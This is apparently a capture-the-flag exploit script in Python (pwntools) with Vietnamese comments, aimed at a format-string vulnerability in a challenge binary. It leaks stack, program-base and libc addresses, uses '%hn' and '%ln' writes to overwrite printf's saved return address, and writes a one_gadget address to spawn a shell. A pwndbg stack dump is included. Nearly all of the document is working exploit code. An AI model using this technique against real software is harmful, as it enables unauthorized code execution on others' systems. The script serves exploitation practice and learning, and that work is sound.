from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './ez_fmt_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
#context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
libc = ELF('./libc.so.6')

def tohex(val, nbits):
    return hex((val + (1 << nbits)) % (1 << nbits))

p = start()
#stage1 leak stack address, leak base address, leak libc address
p.sendline(b'%*21$') # vi tri' 0x0f trên stack
p.recvuntil(b'Service :##\n')
leak_stack = int(p.recvuntil(b'\n')[1:-1].decode()) - 344     # vị trí 0 trên stack RSP
leak_stack_2 = leak_stack - 0x8 # RSP - 8 ( saved rip printf)
leak_stack = tohex(leak_stack, 32)
leak_stack_2 = tohex(leak_stack_2, 32)
log.info('Leak stack: %s' % leak_stack)
p.sendline(b'%*23$') # vị trí trên stack chứa địa chỉ hàm main
leak_base = int(p.recvuntil(b'\n')[1:-1].decode()) - 0x12e1 + 0x1345 # leak đc base của ELF và tính đc đỉa chỉ jump để bypass hàm restrict
leak_base = tohex(leak_base, 32)
log.info('Leak base: %s' % leak_base)
#
p.sendline(b'%' + str(int('0x'+leak_stack[-4:],16)+6).encode() + b'c%21$hn')              # cho vị trí 0x0f trên stack trỏ đến vị trí 0 + 6 bytes dùng để ghi ký tự "p" vào payload ở vị trí 0 
p.recvuntil(b'\x03\n')
p.sendline(b'%' + str(int('0x'+leak_stack_2[-4:],16)).encode() + b'c%37$hn')               # cho vị trí 0x1f trên stack trỏ đến saved rip của printf (main + 117) dùng để ghi đè địa chỉ jump bypass restrict
p.recvuntil(b'\x03\n')
p.sendline(b'bb%19$bb%2667c%49$ln%' + str(int('0x'+leak_base[-4:],16)-2672).encode() + b'c%51$hn' ) #

# ở đây mình sẽ nói đoạn trên tại sao mình +6
# vì ln chỉ ghi đc 2 bytes nên khi bb%19$bb%2667c%49$ln%2672c%51$hn mình cần ghi vào 2 chữ "bb" ở cuối
# 2667c + 8 kí tự phía trước sẽ được 0x0a73 đó chính là "p\n"
'''
pwndbg> stack 50 ()
00:0000│ rdx rdi r8 rsp 0x7ffd154f92f0 ◂— 'bb%19$bb%2667c%49$ln%51413c%51$hn\n'
01:0008│                0x7ffd154f92f8 ◂— '%2667c%49$ln%51413c%51$hn\n'
02:0010│                0x7ffd154f9300 ◂— '9$ln%51413c%51$hn\n'
03:0018│                0x7ffd154f9308 ◂— '13c%51$hn\n'
04:0020│                0x7ffd154f9310 —▸ 0x7ffd15000a6e ◂— 0x0
05:0028│                0x7ffd154f9318 —▸ 0x55d22353d3ad (__libc_csu_init+77) ◂— add    rbx, 1
06:0030│                0x7ffd154f9320 —▸ 0x7f3f88a7a2e8 ◂— 0x0
07:0038│                0x7ffd154f9328 —▸ 0x55d22353d360 (__libc_csu_init) ◂— endbr64
08:0040│                0x7ffd154f9330 ◂— 0x0
09:0048│                0x7ffd154f9338 —▸ 0x55d22353d100 (_start) ◂— endbr64
0a:0050│                0x7ffd154f9340 —▸ 0x7ffd154f9440 ◂— 0x1
0b:0058│                0x7ffd154f9348 ◂— 0xc6dbd188a7a35000
0c:0060│ rbp            0x7ffd154f9350 ◂— 0x0
0d:0068│                0x7ffd154f9358 —▸ 0x7f3f888ad0b3 (__libc_start_main+243) ◂— mov    edi, eax
0e:0070│                0x7ffd154f9360 —▸ 0x7f3f88aaa620 (_rtld_global_ro) ◂— 0x50a1000000000
0f:0078│                0x7ffd154f9368 —▸ 0x7ffd154f9448 —▸ 0x7ffd154f92f6 ◂— 'bb%2667c%49$ln%51413c%51$hn\n'
10:0080│                0x7ffd154f9370 ◂— 0x100000000
11:0088│                0x7ffd154f9378 —▸ 0x55d22353d2e1 (main) ◂— endbr64
12:0090│                0x7ffd154f9380 —▸ 0x55d22353d360 (__libc_csu_init) ◂— endbr64
13:0098│                0x7ffd154f9388 ◂— 0xf6294f19512c0cd
14:00a0│                0x7ffd154f9390 —▸ 0x55d22353d100 (_start) ◂— endbr64
15:00a8│                0x7ffd154f9398 —▸ 0x7ffd154f9440 ◂— 0x1
16:00b0│                0x7ffd154f93a0 ◂— 0x0
17:00b8│                0x7ffd154f93a8 ◂— 0x0
18:00c0│                0x7ffd154f93b0 ◂— 0xf098be6eb3d2c0cd
19:00c8│                0x7ffd154f93b8 ◂— 0xf11d85e435dcc0cd
1a:00d0│                0x7ffd154f93c0 ◂— 0x0
... ↓                   2 skipped
1d:00e8│                0x7ffd154f93d8 ◂— 0x1
1e:00f0│                0x7ffd154f93e0 —▸ 0x7ffd154f9448 —▸ 0x7ffd154f92f6 ◂— 'bb%2667c%49$ln%51413c%51$hn\n'
1f:00f8│                0x7ffd154f93e8 —▸ 0x7ffd154f9458 —▸ 0x7ffd154f92e8 —▸ 0x55d22353d336 (main+85) ◂— cmp    eax, -1
20:0100│                0x7ffd154f93f0 —▸ 0x7f3f88aac190 —▸ 0x55d22353c000 ◂— 0x10102464c457f
21:0108│                0x7ffd154f93f8 ◂— 0x0
22:0110│                0x7ffd154f9400 ◂— 0x0
23:0118│                0x7ffd154f9408 —▸ 0x55d22353d100 (_start) ◂— endbr64
24:0120│                0x7ffd154f9410 —▸ 0x7ffd154f9440 ◂— 0x1
25:0128│                0x7ffd154f9418 ◂— 0x0
26:0130│                0x7ffd154f9420 ◂— 0x0
27:0138│                0x7ffd154f9428 —▸ 0x55d22353d12e (_start+46) ◂— hlt
28:0140│                0x7ffd154f9430 —▸ 0x7ffd154f9438 ◂— 0x1c
29:0148│                0x7ffd154f9438 ◂— 0x1c
2a:0150│ r13            0x7ffd154f9440 ◂— 0x1
2b:0158│                0x7ffd154f9448 —▸ 0x7ffd154f92f6 ◂— 'bb%2667c%49$ln%51413c%51$hn\n'
2c:0160│                0x7ffd154f9450 ◂— 0x0
2d:0168│                0x7ffd154f9458 —▸ 0x7ffd154f92e8 —▸ 0x55d22353d336 (main+85) ◂— cmp    eax, -1
2e:0170│                0x7ffd154f9460 —▸ 0x7ffd154fb5fe ◂— 'LANG=C.UTF-8'
2f:0178│                0x7ffd154f9468 —▸ 0x7ffd154fb60b ◂— 0x6f682f3d48544150 ('PATH=/ho')
30:0180│                0x7ffd154f9470 —▸ 0x7ffd154fbb47 ◂— 'TERM=xterm-256color'
31:0188│                0x7ffd154f9478 —▸ 0x7ffd154fbb5b ◂— 'WSLENV=WT_SESSION::WT_PROFILE_ID'
'''
'''
$21: con trỏ -> con trỏ($0x2b) -> payload
$37: con trỏ -> con trỏ($0x2d) -> saved_rip printf
'''
'''
payload trên sẽ đồng thời ghi payload thành "%bb%19$p\n" và ghi đè saved_rip printf 
'''



p.recvuntil(b'bb0x')
leak_libc = '0x' + p.recv(12).decode()  # leak libc
log.info('Leak libc: %s' % leak_libc) 
libc.address = int(leak_libc, 16) - 0x240b3
one_gadget = hex(libc.address + 0xe3b31) # one_gadget
log.info('One gadget: %s' % one_gadget)
# đến đoạn này vì địa chỉ one_gadget rất to nên ko thể ghi trong 1 lần nên mình chia nó thành 2 phần nhỏ
# bắt đầu từ đoạn dưới mình dùng để ghi one gadget các bạn có thể làm tùy ý
p.sendline(b'%' + str(int('0x'+leak_stack_2[-4:],16) +3 ).encode() + b'c%21$hn') 
pad1 = int(one_gadget[0:8],16)
info('pad1: %s' % hex(pad1))
pad2 = int('0x'+one_gadget[8:],16)
info('pad2: %s' % hex(pad2))
if pad1 > pad2:
    p.sendline(b'%' + str(int(pad2)).encode() + b'c%51$n%' + str(int(pad1-pad2)).encode() + b'c%49$n')
else:
    info("pad1 < pad2:error")
    p.close()

p.interactive()